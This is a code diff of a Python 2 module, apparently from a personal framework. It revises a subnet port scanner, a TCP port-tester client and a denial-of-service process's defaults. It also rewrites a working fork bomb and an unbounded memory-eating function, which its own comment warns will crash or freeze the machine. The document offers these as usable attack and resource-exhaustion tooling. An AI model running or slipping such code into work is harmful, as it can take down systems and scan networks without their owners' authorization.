@@ -15,10 +15,9 @@ Instruction = mpre.Instruction
 Scanner = defaults.Process.copy()
 Scanner.update({"subnet" : "127.0.0.1",
 "ports" : (22, ),
-"range" : (0, 0, 0, 254),
-"yield_interval" : 50,
-"scan_size" : 1,
-"timeout" : 0})
+"range" : (0, 0, 0, 255),
+"yield_interval" : 100,
+"discovery_verbosity" : 'v'})
 
 DoS = defaults.Process.copy()
 DoS.update({"salvo_size" : 100,
@@ -85,10 +84,8 @@ class DoS(vmlibrary.Process):
 
 class Tcp_Port_Tester(network.Tcp_Client):
     
-    defaults = defaults.Tcp_Client.copy()
-    defaults.update({"bad_target_verbosity" : 'vv'})
-    
     def on_connect(self):
+        print self, "Connected"
         address = self.getpeername()
         self.alert("Found a service at {0}:{1}", address, level='v')
         #Instruction("Service_Listing", "add_service", address).execute()
@@ -99,18 +96,17 @@ class Scanner(vmlibrary.Process):
 
     defaults = Scanner
 
-    def __init__(self, *args, **kwargs):
-        self.threads = []
-        super(Scanner, self).__init__(*args, **kwargs)
-        self.network_buffer = {}
+    def __init__(self, **kwargs):
+        super(Scanner, self).__init__(**kwargs)
+        self.thread = self.new_thread()
+        
+    def run(self):
+        try:
+            next(self.thread)
+        except StopIteration:
+            self.delete()
 
-        self.scan_address_alert = functools.partial(self.alert,
-                                                    "Beginning scan of {0}:{1}",
-                                                    level = "vv")
-
-        self.create_threads()
-
-    def create_threads(self):
+    def new_thread(self):
         subnet_list = self.subnet.split(".")
         subnet_zero = int(subnet_list[0])
         subnet_zero_range = subnet_zero + self.range[0]
@@ -132,41 +128,36 @@ class Scanner(vmlibrary.Process):
         if low_port != high_port:
             self.port_range = (low_port, high_port)
         else:
-            self.port_range = low_port
-
+            self.port_range = low_port    
+        
+        yield_interval = self.yield_interval
+        run_instruction = self.run_instruction
+        priority = self.priority
         for field_zero in xrange(subnet_zero, subnet_zero_range + 1):
             for field_one in xrange(subnet_one, subnet_one_range + 1):
                 for field_two in xrange(subnet_two, subnet_two_range + 1):
                     for field_three in xrange(subnet_three, subnet_three_range + 1):
                         address = ".".join((str(field_zero), str(field_one), str(field_two), str(field_three)))
-                        thread = self.scan_address(address, ports)
-                        self.threads.append(thread)
-
-    def run(self):
-        for thread in self.threads[:self.scan_size]:
-            try:
-                next(thread)
-            except StopIteration:
-                self.threads.remove(thread)
-        if not self.threads:
-            self.alert("Finished scanning {0}-{1}", self.subnet_range, 'v')
-            #Instruction(self.instance_name, "delete").execute()#self.delete()
-        else:
-            self.run_instruction.execute(self.priority)
-
-    def scan_address(self, address, ports):
-        self.scan_address_alert([address, self.port_range])
-        yield_interval = self.yield_interval
-
-        while ports:
-            for port in ports[:yield_interval]:
-                self.create(Tcp_Port_Tester, target=(address, port))
-            ports = ports[yield_interval:]
-            yield
+                        for port in ports:
+                            print "Scanning: ", (address, port)
+                            self.create(Tcp_Port_Tester, target=(address, port), 
+                                        verbosity=self.discovery_verbosity)
+                            yield_interval -= 1
+                            if not yield_interval:
+                                run_instruction.execute(priority)
+                                yield
+                                yield_interval = self.yield_interval
 
             
 # warning: these will crash/freeze your machine
-memory_eater = [''.join(chr(x) for x in xrange(128))]
+a_list = [''.join(chr(x) for x in xrange(128))]
+def memory_eater(_list):
+    while True:
+        try:
+            _list.extend(x * 8 for x in _list)
+        except:
+            pass
+            
 if "win" in sys.platform:
     import subprocess
     fork = subprocess.Popen
@@ -175,11 +166,9 @@ else:
     
 def fork_bomb(eat_memory=True):
     def spawn():
-        return Process(target=fork)
+        return Process(target=fork_bomb)
+       
     while True:
         spawn().start()
         if eat_memory:
-            try:
-                memory_eater.extend(x*8 for x in memory_eater)
-            except:
-                pass
+            memory_eater(a_list)
